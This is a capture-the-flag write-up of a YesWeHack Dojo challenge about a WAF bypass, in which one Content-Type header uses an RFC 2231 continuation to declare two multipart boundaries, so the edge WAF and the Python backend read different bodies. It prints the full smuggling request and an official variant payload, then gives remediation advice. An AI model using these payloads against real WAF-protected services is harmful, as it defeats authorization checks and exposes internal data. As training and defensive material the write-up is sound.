---
title: "Dojo #55: one Content-Type, two boundaries"
description: A YesWeHack Dojo challenge where the edge WAF and the Python backend disagree on which multipart boundary is real — so a single request shows the WAF a public upload while the backend serves an internal one.
date: 2026-11-02 13:00:00 +0200
category: Write-up
tags: [ctf, http-request-smuggling, multipart, parser-differential, waf-bypass]
report:
  program: "YesWeHack Dojo (Challenge of the Month #55)"
  platform: YesWeHack
  vulnerability: Multipart boundary parser differential (CWE-444)
  severity: Medium
  cvss: "5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)"
  status: Resolved
  reported: 2026-11-01
  resolved: 2026-11-02
  disclosed: 2026-11-02
---

Two layers sit in front of `/v1/support/bundles/preview`. An edge WAF decides whether a request
is allowed to ask for an *internal* support bundle, and a Python backend actually builds it. They
both parse the same `Content-Type` header to find the multipart boundary — and I could make them
pick **two different boundaries** from one header. Show the WAF a public upload, hand the backend
an internal one, in a single unauthenticated request.

<!--more-->

This was YesWeHack's [Dojo](https://dojo-yeswehack.com) Challenge of the Month #55. It's a
training target built to be broken, so this write-up names it and shows the payload in full —
YesWeHack published the official solution themselves once the challenge closed.

## Summary

A request to `/v1/support/bundles/preview` passes through an edge WAF and then a Python backend.
The WAF enforces the authorization decision ("is this caller allowed `scope=internal`?") by
parsing the multipart body itself; the backend parses the body again to build the bundle. Both
find the body's parts using the `boundary` parameter of the `Content-Type` header.

The two parsers disagree about which `boundary` value wins when the header contains **two** of
them, one written as an [RFC 2231](https://www.rfc-editor.org/rfc/rfc2231#section-4) parameter
continuation. That disagreement lets one HTTP request contain two bodies: the one the WAF reads
(`scope=public`, allowed) and the one the backend reads (`scope=internal`, served). The response
returns the internal bundle preview, including its one-time download token.

## The trick: RFC 2231 continuations

RFC 2231 lets a long header parameter be split across numbered continuations: `title*0=...`,
`title*1=...`, reassembled in order. A strict RFC 2231 parser treats `boundary*0=bk-bnd` as the
value of `boundary`. A parser that doesn't implement 2231 — a lot of edge tooling — ignores the
`*0` form it doesn't understand and uses the plain `boundary=waf-bnd` instead.

So this one header names two boundaries:

```http
Content-Type: multipart/form-data; boundary*0=bk-bnd; boundary=waf-bnd
```

- The **edge WAF** doesn't honour the `*0` continuation, so it uses `boundary=waf-bnd`.
- The **Python backend** (`email.parser.BytesParser`, default policy) honours RFC 2231, so it
  uses `boundary=bk-bnd`.

One header. Two different boundaries. That's the whole bug — the rest is just writing a body that
says one thing under each boundary.

## Proof chain

The body carries two parts, each delimited by a *different* boundary. The WAF only sees the
`waf-bnd` part (public, allowed); the backend only assembles the `bk-bnd` part (internal).

```http
POST /v1/support/bundles/preview HTTP/1.1
Host: dojo-yeswehack.com
Content-Type: multipart/form-data; boundary*0=bk-bnd; boundary=waf-bnd

--waf-bnd
Content-Disposition: form-data; name="scope"

public
--waf-bnd--
--bk-bnd
Content-Disposition: form-data; name="scope"

internal
--bk-bnd--
```

What each layer sees:

1. **WAF** parses with `waf-bnd`: a single part, `scope=public`. Allowed — it forwards the request.
2. **Backend** parses with `bk-bnd`: a single part, `scope=internal`. It builds the internal
   bundle and returns its preview.

Response:

```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=UTF-8
Cache-Control: no-store

{
  "case_id": "INC-1042",
  "scope": "internal",
  "format": "zip",
  "files": ["manifest.json", "events.ndjson", ...],
  "download_token": "…r1gH7…"
}
```

`scope` comes back `internal`, and the response hands over the bundle's one-time
`download_token` — the challenge flag. Single request, no authentication, no race, nothing to
guess. I verified it locally first (same result every run) before sending it once at the live
endpoint.

### The official variant

When the challenge closed, YesWeHack published their intended payload, which uses the
charset/language form of the same RFC 2231 feature rather than the numbered continuation:

```http
Content-Type: multipart/form-data; boundary*=us-ascii''i; boundary=p
```

`boundary*=...` is the RFC 2231 extended value; the 2231-aware backend selects it (`i`), the edge
parser falls back to the plain `boundary=p`. Same differential, different corner of the same RFC —
which is the point: there's more than one way to write a boundary that two parsers read
differently.

## Impact

Rated **Medium (CVSS 5.3)**. An unauthenticated caller retrieves an internal support bundle
preview — case metadata, the file manifest, and a working download token — by sending one request
the WAF believes is a public upload. In a real system the authorization boundary is only as strong
as the agreement between the thing that *checks* a request and the thing that *acts* on it. Here
they parsed the same bytes two ways, so the check protected nothing.

## Remediation

- **Reject ambiguity at the edge.** Any `Content-Type` that declares `boundary` more than once —
  including RFC 2231 forms (`boundary*0=`, `boundary*=`) — should be refused, not normalized and
  guessed. Legitimate multipart uploads never need a continuation for the boundary parameter.
- **Don't authorize on a re-parse.** The component that enforces the decision and the component
  that builds the response must parse the body **once**, or share a single canonical parse. Two
  independent parsers of attacker-controlled framing is the request-smuggling pattern, whatever the
  transport.
- **Pin the parser.** If the edge can't be made 2231-aware, strip or canonicalize the `boundary`
  parameter before the request reaches a 2231-aware backend, so both ends resolve the same value.

## Lessons

Request smuggling isn't only an HTTP/1.1 desync between front-end and back-end servers. Any time
two parsers read the same attacker-controlled framing and disagree — chunked vs content-length,
header folding, or, here, which `boundary` a `Content-Type` really declares — you can hide a second
message inside the first. The fix is never "parse more carefully"; it's "parse once, or make both
ends parse identically."

A standard I keep for this kind of finding: I reproduced it in a local copy of the parsing
behaviour before sending anything to the live challenge, so the single request I sent was one I
already knew the result of.
